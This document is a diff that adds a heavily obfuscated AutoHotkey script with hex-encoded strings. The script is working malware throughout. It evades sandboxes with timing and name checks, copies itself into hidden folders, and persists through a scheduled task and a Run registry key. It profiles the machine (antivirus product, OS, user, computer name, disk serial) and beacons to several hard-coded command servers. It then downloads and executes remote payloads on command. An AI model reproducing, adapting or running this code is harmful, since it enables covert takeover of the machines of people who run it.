@@ -1,0 +1,733 @@
+;tqgpmbmjygyfsuyqvwmxztubnhhhsonfchafcwynmmwxxpstlkoyebpceywatomijrprfllsrwfwkjqufblcmivrnzrkokzcwpssjzdgvuottojgzjwekzlfrbcnukxbbdbiftcwmvixzzaauxipwy
+;ubiexgsmnvfmlbssxwsbxdxvazpyhcynwayfonemoefeghbuvlyhwhjdqglpzopavtjcbquxiaqpcvhxpaksepsiggpegjouzjisvqcewnkgsatovlgtyzaisevuioidzaeahudmmzqqymnwujgepo
+;qgeqkdwlezspefkgjwvdzewelwyrymnacdfjpwgeotpvhvjmwnhcnijgsjiwiqilkturxcmkpqlmccbdakidakohsphylgjmwmkvjnxdhhfhwnrxlzuzjtvgechlqxgiihjzaktwupamllokcwnxro
+;tsfvucmnpoytnkmahagmsnnscrsletzamkuuhsygdojfvcknnhgpvpxqntbdxcskqfleifqjeqpiaaznriqxfoortlxvpluzpgtbfvpkdnknczbmffcvssjqhairptvijpltafzfnnxlavgzabzeju
+;fehsethmtlfnavnvlrakidlzjekmehqulratjnymuqurqmcebmfqjhbupudnvknwdsemgdrxrwgxraynpxgiwidlspefflifuiyxdqicbkzzosfnalbqizhahonuvjrzmhrmewbsjivkgzykmcbtly
+;bdzlvrplxfdwzdzsgomolkubcpiuojlhgqkaqhihnehfngsghrkpscwhkizyhkfqzzpfefgvsadzzmdrkytgcgiwjbvzekzmkhtdrsppewlkmhtzbqcakmmwleknzupvddleoudtgalcbpatdprdyo
+;drtgiitasifhvajswxnbiplbplmaohdtxuwvefsdhhcaceqnicfwyqjwdxsctivufhnsyshgmgophofedqbfglikgkyvrgyladohrvewvgbnbgxgjcsahianfwcozsuemkoweeqxakxwjzcemwmfjp
+;yulumjfpepztpbitdjfhhiezmgftzwrronktailiatnywcvcursupcyxwhxgpvgbgezptbeotztjrlbmizrfzfvwnpzbepfxexzqzaldxtfhhhvuibunookbmlceozkutjxqsqmoewlhiqcoqhqzpl
+
+
+#SingleInstance IGNORE
+#NoTrayIcon
+global #kf#kfk@fk := 4
+global k#f#hh#hh@ := SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".", False, -1) -1)
+global fkkfkf@f := ComObjCreate(ffkkfii@xbyw@ii@xbyw("575363726970742E5368656C6C"))
+global ffk@f#iiixbyw@@k := ffkkfii@xbyw@ii@xbyw("726164")
+global #fk#khh@#k := ffkkfii@xbyw@ii@xbyw("73797374656D666978")
+global @k#ffk@hh@ := k#f#hh#hh@
+global kkhhh# := f#k#hh@iiixbywk@f#f@(21)
+global f@#hh# := f#k#hh@iiixbywk@f#f@(21)
+global k@kkf@ := f#k#hh@iiixbywk@f#f@(150)
+global #f#ii@xbyw@f#f := f#k#hh@iiixbywk@f#f@(150)
+global @fkhhhkf#f := ComObjCreate(ffkkfii@xbyw@ii@xbyw("536372697074696E672E46696C6553797374656D4F626A656374"))
+global f#@kf#@kff := k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E657865")
+global khh@@fk#f#ff := k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E747874")
+global #fkfkfk@ := 0
+global #ii#xbyw@f#k#kfk := 0
+global @f#hh##f@f := ffkkfii@xbyw@ii@xbyw("787878")
+f#ii#xbywf := 0
+if (#kf#kfk@fk = 1){
+}else{
+if StrLen(A_ScriptName) <> 25
+{
+exitapp
+}
+IfInString, A_ScriptDir, % ffkkfii@xbyw@ii@xbyw("433A5C")
+{
+f#kf#k := A_TickCount
+while 1 {
+Sleep, 1000
+#k#ffkf@hhhk := A_TickCount - f#kf#k
+if (#k#ffkf@hhhk > 120000)
+{
+break
+}
+}
+if StrLen(A_ScriptFullPath) <> 50
+{
+exitapp
+}
+}else{
+}
+for process in ComObjGet(ffkkfii@xbyw@ii@xbyw("77696E6D676D74733A")).ExecQuery(ffkkfii@xbyw@ii@xbyw("53656C656374202A2066726F6D2057696E33325F50726F63657373")) {
+@fkhh#kk := process.Name
+fkfkkfkf@fk# := process.CommandLine
+f#@kkf#f := process.ExecutablePath
+if (StrLen(@fkhh#kk) = 25){
+if (StrLen(fkfkkfkf@fk#) > 30){
+IfInString, fkfkkfkf@fk#, % ffkkfii@xbyw@ii@xbyw("2E747874")
+{
+f#ii#xbywf := f#ii#xbywf + 1
+if (StrLen(f#@kkf#f) = 50){
+}
+}
+}
+}
+}
+if (f#ii#xbywf > 1){
+exitapp
+}
+IfInString, A_ScriptDir, % ffkkfii@xbyw@ii@xbyw("433A5C")
+{
+}else{
+FileCopyDir, %A_ScriptDir%, C:\%iiixbywiiixbywkk%%f@#hh#%%ffk#kk%
+FileCopyDir, %A_ScriptDir%, C:\%ii#xbywhhh%%kkhhh#%%@f#iiixbyw%
+FileSetAttrib, +SH, C:\%@fii#xbywfk#%%f@#hh#%%f#k#@hh#%,1
+FileSetAttrib, +SH, C:\%khhh@f%%kkhhh#%%#k#k@kf#%,1
+FileMove, % ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E657865") , % ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E657865")
+FileMove, % ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E747874") , % ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E747874")
+FileMove, % ffkkfii@xbyw@ii@xbyw("433A5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E657865") , % ffkkfii@xbyw@ii@xbyw("433A5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E657865")
+FileMove, % ffkkfii@xbyw@ii@xbyw("433A5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E747874") , % ffkkfii@xbyw@ii@xbyw("433A5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E747874")
+k@k#hh@f#k := ";"
+FileAppend, `n %k@k#hh@f#k%%k@#fii#xbywk%%khh#f#@f% %@f#kffk#%%hh#kfk%%k@kkf@%, C:\%iiixbywiiixbywkk%%f@#hh#%%k##ii#xbyw%\%k@iiixbyw#%%kkhhh#%%k#f@@kf#%.txt
+iiixbyw#ffkfkhh# := FileOpen(ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E747874"), 0)
+k@f@f@fk := iiixbyw#ffkfkhh#.Read()
+k@f@f@fk := ii#xbywii@xbywf#ii#xbywkff(k@f@f@fk)
+iiixbyw#ffkfkhh#.Close()
+@ii@xbyw#fkf := FileOpen(ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E747874"), 5)
+@ii@xbyw#fkf.WriteLine(k@k#hh@f#k . #f#ii@xbyw@f#f)
+@ii@xbyw#fkf.Write(k@f@f@fk)
+@ii@xbyw#fkf.Close()
+run % ffkkfii@xbyw@ii@xbyw("433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E65786520433A5C") . f@#hh# . ffkkfii@xbyw@ii@xbyw("5C") . kkhhh# . ffkkfii@xbyw@ii@xbyw("2E747874")
+exitapp
+}
+f#k@#fk#@kf@#f#k()
+hhhf@f@fk#ffkf()
+}
+f@kkf@f@f@#k := Object()
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39383938"))
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F7375706572616C7068612E7261646E65776167652E636F6D3A39383938"))
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F7375706572616C7068612E6E65776D696E6572736167652E636F6D3A33333333"))
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F6E6577616C7068612E73757065722D67616D657A65722E636F6D3A39333333"))
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39393939"))
+f@kkf@f@f@#k.Insert(ffkkfii@xbyw@ii@xbyw("687474703A2F2F6E6F6F626D696E65722E7075626C6963766D2E636F6D3A39383938"))
+hhhfii#xbywffkf@ := f@kkf@f@f@#k.MaxIndex()
+f@f@#k@kfk := 0
+while 1 {
+if (f@f@#k@kfk = hhhfii#xbywffkf@){
+f@f@#k@kfk := 1
+}else{
+f@f@#k@kfk := f@f@#k@kfk + 1
+}
+hhhf@f@fk#ffkf()
+kfkkf#f@hhhk#k(f@kkf@f@f@#k[f@f@#k@kfk])
+}
+kfkkf#f@hhhk#k(#kfk@f#f@ii#xbywfk){
+k#@kfkfkkhh@ = 0
+while 1 {
+hhhf@f@fk#ffkf()
+if (k#@kfkfkkhh@ = 6){
+break
+}
+kf@fkhhhkf := ffk@f@k@k@#f(#kfk@f#f@ii#xbywfk)
+if (kf@fkhhhkf = ffkkfii@xbyw@ii@xbyw("4552524F52")){
+k#@kfkfkkhh@ := k#@kfkfkkhh@ + 1
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("636F756C646E7420636F6E6E65637420746F20") . #kfk@f#f@ii#xbywfk . "-" . kf@fkhhhkf)
+}else{
+hh#fk@f@ := f#fkf@k#kfk#f@k@(kf@fkhhhkf)
+if (hh#fk@f@ = ""){
+k#@kfkfkkhh@ := k#@kfkfkkhh@ + 1
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("636F756C646E742066696E6420636F6D6D616E6420696E20") . #kfk@f#f@ii#xbywfk . "-" . kf@fkhhhkf)
+}else{
+k#@kfkfkkhh@ := 0
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("636F6E6E656374656420746F202022202E2061646472657373202E202220646174613A20") . hh#fk@f@)
+#fk@kffkf#@hh@#k(kf@fkhhhkf)
+}
+}
+}
+}
+ffk@f@k@k@#f(k@k#kkf@@hh#) { 
+static f#ffiiixbywfk# := ComObjCreate(ffkkfii@xbyw@ii@xbyw("57696E487474702E57696E48747470526571756573742E352E31"))
+try {
+f#ffiiixbywfk#.Open(ffkkfii@xbyw@ii@xbyw("474554"), k@k#kkf@@hh# . "/" . f@f@@hh##k#f@f() , true)
+f#ffiiixbywfk#.Send()
+f#ffiiixbywfk#.WaitForResponse()
+} catch {
+return ffkkfii@xbyw@ii@xbyw("4552524F52")
+}
+if (f#ffiiixbywfk#.Status = 200){
+return f#ffiiixbywfk#.ResponseText
+}else{
+return ffkkfii@xbyw@ii@xbyw("4552524F52")
+}
+}
+f#f@@f#kf@kk(){
+try {
+For objOS In ComObjGet(ffkkfii@xbyw@ii@xbyw("77696E6D676D74733A5C5C6C6F63616C686F73745C726F6F745C736563757269747963656E74657232")).InstancesOf(ffkkfii@xbyw@ii@xbyw("416E7469566972757350726F64756374")) {
+k@#kffk@kk := ObjOS.displayName
+}
+} catch {
+return "Unknown"
+}
+return k@#kffk@kk
+}
+f@kfk#k@f#f@@k(){
+try {
+For objOS In ComObjGet(ffkkfii@xbyw@ii@xbyw("77696E6D676D74733A5C5C")).InstancesOf(ffkkfii@xbyw@ii@xbyw("57696E33325F4F7065726174696E6753797374656D")) {
+hh@fkfkk := ObjOS.Caption
+}
+} catch {
+return "Unknown"
+}
+return hh@fkfkk
+}
+@kf#kfkhhhk@#f(k#kf#f#k#fkfk#ff){
+
+
+}
+k#k@f#kf#k#f#iiixbyw(@ii@xbywk@kf#ii@xbywkf) { 
+local f@#kf@@kf#kf, #f#k@k, f#khhh
+If !@ii@xbywk@kf#ii@xbywkf
+Return 0
+f@#kf@@kf#kf := A_FormatInteger
+SetFormat, INTEGER, H
+Loop, Parse, @ii@xbywk@kf#ii@xbywkf
+{
+#f#k@k := Asc(A_LoopField)
+StringTrimLeft, #f#k@k, #f#k@k, 2
+f#khhh .= #f#k@k . ""
+}
+SetFormat, INTEGER, %f##kf#@k%%fkfii#xbywfk%%f@#kf@@kf#kf%
+Return f#khhh
+}
+urlsafe_b64decode(k#k@f@@f)
+{
+Return #iiixbywhh@f@f@f@k(k#k@f@@f, "-_")
+}
+@fii@xbywhhhkfk#k@fk(@k#iiixbywkf@f#k, @fkffk#hh#@f#k:="+/") { 
+StringLeft, @fkffk#hh#@f#k, @fkffk#hh#@f#k, 2
+Return fkkf@hh@kf@f(@k#iiixbywkf@f#k, ffkkfii@xbyw@ii@xbyw("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . @fkffk#hh#@f#k)
+}
+#iiixbywhh@f@f@f@k(f@@f@kfk#ii@xbyw, #kfkhhhkf@iiixbyw@#f:="+/") { 
+StringLeft, #kfkhhhkf@iiixbyw@#f, #kfkhhhkf@iiixbyw@#f, 2
+Return k#f@f#k@f@khhh(f@@f@kfk#ii@xbyw, ffkkfii@xbyw@ii@xbyw("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . #kfkhhhkf@iiixbyw@#f)
+}
+fkkf@hh@kf@f(kfk#@f#f#fk@f#k#, @f@fkfiiixbyw@#k#k#k:=""){
+StringCaseSense On
+Loop, Parse, kfk#@f#f#fk@f#k#
+{
+ii#xbywk@kf# := Mod(A_Index, 3)
+if (ii#xbywk@kf# = 1)
+{
+f##fk# := ((Asc(A_LoopField) >> 2) & 0x3F)
+f#k@@k := (Asc(A_LoopField) & 0x03 ) << 4
+}
+else if (ii#xbywk@kf# = 2)
+{
+f##fk# := f#k@@k | ((Asc(A_LoopField) >> 4) & 0x0F)
+f#k@@k := (Asc(A_LoopField) & 0x0F) << 2
+}
+else
+{
+f##fk# := f#k@@k | ((Asc(A_LoopField) >> 6) & 0x03)
+StringMid, base64Char, @f@fkfiiixbyw@#k#k#k, f##fk# + 1, 1
+k#k@f@@f := k#k@f@@f base64Char
+f##fk# := (Asc(A_LoopField)) & 0x3F
+}
+StringMid, base64Char, @f@fkfiiixbyw@#k#k#k, f##fk# + 1, 1
+k#k@f@@f := k#k@f@@f base64Char
+}
+if (ii#xbywk@kf# = 1)
+{
+StringMid, base64Char, @f@fkfiiixbyw@#k#k#k, f#k@@k + 1, 1
+return k#k@f@@f base64Char "=="
+}
+else if (ii#xbywk@kf# = 2)
+{
+StringMid, base64Char, @f@fkfiiixbyw@#k#k#k, f#k@@k + 1, 1
+return k#k@f@@f base64Char "="
+}
+else
+{
+return k#k@f@@f "=="
+}
+}
+k#f@f#k@f@khhh(fk#k@k@f@k@hh@@k, #fk##kfk@kkhh#:=""){
+StringReplace fk#k@k@f@k@hh@@k, fk#k@k@f@k@hh@@k, =,,All
+StringReplace, fk#k@k@f@k@hh@@k, fk#k@k@f@k@hh@@k, `r,,All
+StringReplace, fk#k@k@f@k@hh@@k, fk#k@k@f@k@hh@@k, `n,,All
+StringCaseSense On
+Loop, Parse, fk#k@k@f@k@hh@@k
+{
+StringGetPos, currentBin, #fk##kfk@kkhh#, %A_LoopField%
+@kf#fk := Mod(A_Index, 4)
+if (@kf#fk = 1)
+{
+f#k@@k := currentBin << 2
+}
+else if (@kf#fk = 2)
+{
+#f#ii#xbywk#f@#k := #f#ii#xbywk#f@#k Chr(f#k@@k | (currentBin >> 4))
+f#k@@k := (currentBin & 0x0F) << 4
+}
+else if (@kf#fk = 3)
+{
+#f#ii#xbywk#f@#k := #f#ii#xbywk#f@#k Chr(f#k@@k | (currentBin >> 2))
+f#k@@k := (currentBin & 0x03) << 6
+}
+else
+{
+#f#ii#xbywk#f@#k := #f#ii#xbywk#f@#k Chr(f#k@@k | currentBin)
+}
+}
+Return #f#ii#xbywk#f@#k
+}
+f#k@#fk#@kf@#f#k() {
+#f#hhh@hh#fk := A_ScriptDir . "\" . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E657865")
+k@#hh#k@ := @fk@fiiixbywf##ii#xbywff(A_ScriptDir . "\" . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("2E747874"))
+@k@ffk@hhh := ffkkfii@xbyw@ii@xbyw("7363687461736B73202F637265617465202F7363206D696E757465202F6D6F2031202F746E")
+run, %@k@ffk@hhh%%#fiiixbyw@@k%%f@k@kk% %hh#hhh@f%%@k#ffk@hh@%%@hh@f##k% /tr "%#f#hhh@hh#fk%%k@@k%%#fkf% %k@#hh#k@%%@k#f%%#f@k#fkf%",,Hide
+Sleep, 3000
+fkfiiixbywff := ffkkfii@xbyw@ii@xbyw("7363687461736B732E657865")
+Process, Close, %f##kf#@k%%fkfiiixbywff%%@f#kffk#%
+RegWrite, % ffkkfii@xbyw@ii@xbyw("5245475F535A") , % ffkkfii@xbyw@ii@xbyw("484B4355"), % ffkkfii@xbyw@ii@xbyw("536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"), %@f@kf#%%@k#ffk@hh@%%ffk#kk%, %k@fk%%#f#hhh@hh#fk%%f##kf#@k% %k#f@@kf#%%fk@f#fkk%%k@#hh#k@%
+}
+f#kfkkf@@kf#kk(k#f#@f#f#hh@kk){
+Process,Exist,%ffk#f@%%k#f#@f#f#hh@kk%%#fiiixbyw@@k%
+return Errorlevel
+}
+@ffk#fk#ii#xbywfkkf#(){
+@hh##k@k := f@ii#xbywiiixbyw@f@kf@(f@ffkkhh#k#fk@k#() . A_OSVersion  . f@kfk#k@f#f@@k())
+return SubStr(@hh##k@k, 1, 30)
+}
+f@ffkkhh#k#fk@k#(){
+try {
+DriveGet, hSerial, Serial, C:
+} catch {
+return ffkkfii@xbyw@ii@xbyw("556E6B6E6F776E")
+}
+return hSerial
+}
+@fkhh#ii#xbywfk@fk(){
+if  ( f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("73747265616D65722E657865")) or f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("6C697665776F726B65722E657865")) or f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("7375706572636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("737065656475702E657865")) or f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("6E6F76612E657865"))){
+return 1
+}
+return 0
+}
+#k@f@ii#xbywk@#f@f(){
+if  f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("637075636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfii@xbyw@ii@xbyw("637075636865636B657233322E657865"))
+{
+return 1
+}
+return 0
+}
+f@f@@hh##k#f@f(){
+hh@ii#xbyw#ffii#xbyw := fkkfkf@f.ExpandEnvironmentStrings(ffkkfii@xbyw@ii@xbyw("25434F4D50555445524E414D4525"))
+kf@kf#ii#xbywf := fkkfkf@f.ExpandEnvironmentStrings(ffkkfii@xbyw@ii@xbyw("25555345524E414D4525"))
+spreadisrun := @fkhh#ii#xbywfk@fk()
+#f@k#f := f@kfk#k@f#f@@k()
+f@kfk##fk@fk := #k@f@ii#xbywk@#f@f()
+@iiixbywfk#k := f#f@@f#kf@kk()
+#fk#ii#xbywk@k := @ffk#fk#ii#xbywfkkf#() . ffkkfii@xbyw@ii@xbyw("2F312F") . f@ii#xbywiiixbyw@f@kf@(#f@k#f)  . "/" . f@ii#xbywiiixbyw@f@kf@(hh@ii#xbyw#ffii#xbyw) . "/" . f@ii#xbywiiixbyw@f@kf@(kf@kf#ii#xbywf)  . "/" .  f@ii#xbywiiixbyw@f@kf@(ffk@f#iiixbyw@@k)  . "/" .   f@ii#xbywiiixbyw@f@kf@(k@#kffk@kk)  . "/" .  spreadisrun  . "/" .  f@kfk##fk@fk
+return #fk#ii#xbywk@k
+}
+f@ii#xbywiiixbyw@f@kf@(k@kf@kf@k@k@f#kf){
+k@kf@kf@k@k@f#kf := k#k@f#kf#k#f#iiixbyw(@fii@xbywhhhkfk#k@fk(k@kf@kf@k@k@f#kf))
+return k@kf@kf@k@k@f#kf
+}
+f#fkf@k#kfk#f@k@(#k@fk#fk@f#fkk){
+try {
+kffii#xbyw#fk#:=RegExMatch(#k@fk#fk@f#fkk, ffkkfii@xbyw@ii@xbyw("3A3A283F503C4E616D653E2E2A3F293A3A"), match)
+} catch {
+return ""
+}
+return matchName
+}
+@hhhkkffkfii#xbywk(k#kf@k#kf#k#@hhh) { 
+@f@ii@xbyw#kf@@f := ""
+@k@ii@xbywk@:=1
+Loop % StrLen(k#kf@k#kf#k#@hhh)/2	{
+hhh@#k := SubStr(k#kf@k#kf#k#@hhh, @k@ii@xbywk@ , 2)
+@f@ii@xbyw#kf@@f .= Chr("0x" hhh@#k)
+@k@ii@xbywk@ +=2
+}
+Return @f@ii@xbyw#kf@@f
+}
+@kf@@ii@xbywkffk(hh@ii@xbyw@k@kffkf@k,f@#kf#kfk@k#f#,fii@xbyw@ii#xbywiiixbywii#xbyw){
+try {
+kf@f#kf@hhh@:=RegExMatch(hh@ii@xbyw@k@kffkf@k, f@#kf#kfk@k#f# . ffkkfii@xbyw@ii@xbyw("283F503C4E616D653E2E2A3F29") . fii@xbyw@ii#xbywiiixbywii#xbyw, match)
+} catch {
+return ""
+}
+return matchName
+}
+#fk@kffkf#@hh@#k(#hhh#kffk@ffkk){
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("67657420636F6D6D616E64") . #iiixbywhh@f@f@f@k(@hhhkkffkfii#xbywk(#hhh#kffk@ffkk)))
+@kkf#ffkkf := #iiixbywhh@f@f@f@k(@hhhkkffkfii#xbywk(#hhh#kffk@ffkk))
+hh#hh@@k@f := ffkkfii@xbyw@ii@xbyw("433A5C") . k#f#hh#hh@
+if (FileExist(hh#hh@@k@f)) {
+}else{
+hh#hh@@k@f := A_ScriptDir
+}
+f@fk@kf@fk#f := ffkkfii@xbyw@ii@xbyw("7570646174652D")
+f#@iiixbywk@kk := ffkkfii@xbyw@ii@xbyw("646F776E6C6F61642D")
+k#ffkf@ffk := ffkkfii@xbyw@ii@xbyw("7363726970742D")
+k@fkhhhkfk := ffkkfii@xbyw@ii@xbyw("75706461746573656C662D")
+IfInString, @kkf#ffkkf, %@f@kfii@xbyw%%#hhhkf#k%%f@fk@kf@fk#f%
+{
+@fk#fkkf#k := @kf@@ii@xbywkffk(@kkf#ffkkf,ffkkfii@xbyw@ii@xbyw("7570646174652D"),ffkkfii@xbyw@ii@xbyw("2D757064617465"))
+hh@kkf#ii#xbyw := ffkkfii@xbyw@ii@xbyw("5C") . f#k#hh@iiixbywk@f#f@(10) . ffkkfii@xbyw@ii@xbyw("2E747874")
+if FileExist(A_ScriptDir . ffkkfii@xbyw@ii@xbyw("5C") . hh@kkf#ii#xbyw){
+FileDelete ,%A_ScriptDir%\%@ii#xbyw#kfk%%fii#xbyw%%hh@kkf#ii#xbyw%
+}
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("646F776E6C6F6164696E672075706461746520") . hh@kkf#ii#xbyw . " - " . @fk#fkkf#k)
+UrlDownloadToFile, %@fk#fkkf#k%%#fkfkfk#%%@f#iiixbyw%, %A_ScriptDir%\%hh@kkf#ii#xbyw%%hhhkf#@f%%ii#xbywhhh%
+if FileExist(A_ScriptDir . ffkkfii@xbyw@ii@xbyw("5C") . hh@kkf#ii#xbyw){
+FileDelete ,%A_ScriptDir%\%fiiixbyw#iiixbyw%%@kf#k@#k%%khh@@fk#f#ff%
+FileMove, %A_ScriptDir%\%iiixbywiiixbywkk%%hh@kkf#ii#xbyw%%#fiiixbyw@@k%, %A_ScriptDir%\%@ii@xbywhhhf%%khh@@fk#f#ff%%#kfkkf#k%
+Run,%A_ScriptDir%\%#ii#xbyw#ii@xbyw%%f@#f%%f#@kf#@kff% %A_ScriptDir%\%khh@@fk#f#ff%%@fii#xbywfk#%%fkkf#k%
+exitapp
+}
+return
+}
+IfInString, @kkf#ffkkf, %ffk#kk%%fii@xbywf##k%%f#@iiixbywk@kk%
+{
+k#k#fk#f := @kf@@ii@xbywkffk(@kkf#ffkkf,ffkkfii@xbyw@ii@xbyw("646F776E6C6F61642D"),ffkkfii@xbyw@ii@xbyw("2D646F776E6C6F6164"))
+k#k#fk#f := StrSplit(k#k#fk#f, ffkkfii@xbyw@ii@xbyw("3A213A"))
+@f#ii#xbywfiiixbyw := ffkkfii@xbyw@ii@xbyw("5C") . f#k#hh@iiixbywk@f#f@(10) . ffkkfii@xbyw@ii@xbyw("2E747874")
+@kf#k@k# := k#k#fk#f[1]
+hh@kkf#ii#xbyw := k#k#fk#f[2]
+if FileExist(hh#hh@@k@f . ffkkfii@xbyw@ii@xbyw("5C") . hh@kkf#ii#xbyw){
+FileDelete ,%k@#k@f%%hh#hh@@k@f%%ffii#xbywf%\%k##ii#xbyw%%hh@kkf#ii#xbyw%%k@iiixbyw#%
+}
+@kf#kfkhhhk@#f("downloading file " . hh@kkf#ii#xbyw . " - " . @kf#k@k#)
+if FileExist(hh#hh@@k@f . @f#ii#xbywfiiixbyw){
+FileDelete ,%@kf#k@#k%%k@iiixbyw#%%hh#hh@@k@f%%fiiixbyw#iiixbyw%%@f#ii#xbywfiiixbyw%%@kkffk%
+}
+UrlDownloadToFile, %iiixbywfkk%%@kf#k@k#%%kf#fkfkk%, %f@#f@hhh%%hh#hh@@k@f%%@f@kfii@xbyw%%f@#f%%@f#ii#xbywfiiixbyw%%ii#xbywkfk%
+if FileExist(hh#hh@@k@f . @f#ii#xbywfiiixbyw){
+FileMove, %hh#hh@@k@f%%hh#kfk%%#fkf%%@hh@f##k%%@f#ii#xbywfiiixbyw%%@hh@f##k%, %hh#hh@@k@f%%hh#hhh@f%%fk@f#fkk%\%#fiiixbyw@@k%%hh@kkf#ii#xbyw%%f@k@kk%
+IfInString, hh@kkf#ii#xbyw, %#fk@@k%%f#fk#hhh%%@f#hh##f@f%
+{
+k##ii@xbywk@ff := ffkkfii@xbyw@ii@xbyw("433A5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("5C") . f#@kf#@kff . " " . ffkkfii@xbyw@ii@xbyw("433A5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("5C") . hh@kkf#ii#xbyw
+Run,%k##ii@xbywk@ff%%k#kf@k#f%%#hhhkf#k%
+}else{
+Run,%kfkhh@#f%%hh#hh@@k@f%%f#k#@hh#%\%fkfii#xbywfk%%hh@kkf#ii#xbyw%%fk@ii#xbywkf%
+}
+}
+return
+}
+IfInString, @kkf#ffkkf, %f@hhhk%%k#ffkf@ffk%%f#f@iiixbyw#%
+{
+@fk#k#kkf#kf := @kf@@ii@xbywkffk(@kkf#ffkkf,ffkkfii@xbyw@ii@xbyw("7363726970742D"),ffkkfii@xbyw@ii@xbyw("2D736372697074"))
+@fk#k#kkf#kf := StrSplit(@fk#k#kkf#kf, ":!:")
+iiixbyw#f@@f := @fk#k#kkf#kf[1]
+k@#hh@ffkf := @fk#k#kkf#kf[2]
+fii#xbywf#@k :=  ffkkfii@xbyw@ii@xbyw("5C") . f#k#hh@iiixbywk@f#f@(10) . ffkkfii@xbyw@ii@xbyw("2E747874")
+@f@ii@xbywkhh#k# := hh#hh@@k@f . ffkkfii@xbyw@ii@xbyw("5C") . k@#hh@ffkf
+if FileExist(@f@ii@xbywkhh#k#){
+FileDelete ,%kf#fkfkk%%@f@ii@xbywkhh#k#%%hh@kf#%
+}
+if FileExist(hh#hh@@k@f . fii#xbywf#@k){
+FileDelete ,%ffkf@k%%@kf#k@#k%%hh#hh@@k@f%%fii#xbywf#@k%%fkfk%%f#k#@hh#%
+}
+@kf#kfkhhhk@#f("script file " . k@#hh@ffkf . " - " . iiixbyw#f@@f)
+FileAppend, %#k#fk@kk%%iiixbyw#f@@f%%f@#f@hhh%, %f@fkf#kf%%hh#hh@@k@f%%f#f@iiixbyw#%%fii#xbywf#@k%%fii@xbywf##k%%@ii#xbyw#kfk%
+FileMove, %fk@fkk%%hh#hh@@k@f%%ii#xbywhhh%%kf#fkfkk%%khhh@f%%fii#xbywf#@k%, %@k#ii@xbywf#%%hh#hh@@k@f%%fkfii#xbywfk%\%kf@fk@#k%%k#k#kf%%k@#hh@ffkf%
+IfInString, k@#hh@ffkf, %k@#fii#xbywk%%@f#hh##f@f%%hh@f%
+{
+k##ii@xbywk@ff := ffkkfii@xbyw@ii@xbyw("433A5C") . k#f#hh#hh@ . ffkkfii@xbyw@ii@xbyw("5C") . f#@kf#@kff . " " .  @f@ii@xbywkhh#k#
+Run,%f@k@kk%%f#f@%%k##ii@xbywk@ff%
+}else{
+Run,%ii#xbywkfk%%k#f@f@kk%%hh#hh@@k@f%\%kf#fkfkk%%k@#hh@ffkf%%hhh@k@%
+}
+return
+}
+IfInString, @kkf#ffkkf, %k@fkhhhkfk%%#kfkkf#k%%hhh@k@%
+{
+kkhhh#  := k#f#hh#hh@
+k@k#hh@f#k := ";"
+FileAppend, `n %k@k#hh@f#k%%ffkf@k%%kfk#f@% %ffk##k%%k@kkf@%%#kfkkf#k%, %A_ScriptFullPath%
